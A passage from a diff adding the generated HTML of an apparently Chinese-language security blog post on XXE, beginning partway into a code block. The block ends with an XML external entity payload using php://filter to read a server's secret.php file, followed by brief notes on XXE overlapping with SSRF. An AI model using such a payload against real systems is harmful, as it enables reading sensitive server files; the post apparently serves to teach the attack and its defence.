+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ENTITY xxe SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/var/www/html/secret.php&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/root&gt;</span>
+</span></span></code></pre></div><h1 id="其他参考与延伸">其他参考与延伸</h1>
+<ul>
+<li>XXE 与 SSRF 在某些场景重合（例如外部实体触发对内网请求），在应急响应时需要同时考虑两者影响范围。</li>
+<li>对于复杂环境（容器、沙箱），要判断解析器是否支持外部实体、是否允许访问宿主文件系统或内置协议。</li>
+</ul>
+<hr></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://118.178.86.67/list/apt/%E6%B5%85%E8%B0%88%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>浅谈电子邮件伪造</span></a>
+    
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://118.178.86.67/">Hzhsrc home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
+  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
